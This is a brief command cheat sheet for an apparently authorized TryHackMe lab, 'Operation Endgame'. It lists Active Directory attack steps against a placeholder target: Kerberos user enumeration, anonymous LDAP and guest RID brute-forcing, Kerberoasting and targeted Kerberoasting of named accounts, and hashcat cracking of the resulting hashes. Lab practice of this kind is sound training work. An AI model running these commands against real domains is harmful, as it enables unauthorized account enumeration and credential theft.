# Operation Endgame — Command Reference

> Authorized TryHackMe laboratory only.

```bash
kerbrute userenum -d thm.local users.txt --dc TARGET
```

```bash
ldapsearch -x -H ldap://TARGET -b "DC=thm,DC=local"
```

```bash
nxc smb TARGET -u 'guest' -p '' --rid-brute
```

```bash
nxc ldap TARGET -u guest -p '' --kerberoasting output_hash.txt --kdcHost TARGET
```

```bash
hashcat -m 13100 cody.hash /usr/share/wordlist/rockyou.txt
```

```bash
targetedKerberoast.py -d thm.local -u ZACHARY_HUNT -p 'REDACTED' --dc-ip TARGET --request-user JERRI_LANCASTER
```

```bash
hashcat -m 13100 jerri.hash /usr/share/wordlists/rockyou.txt
```
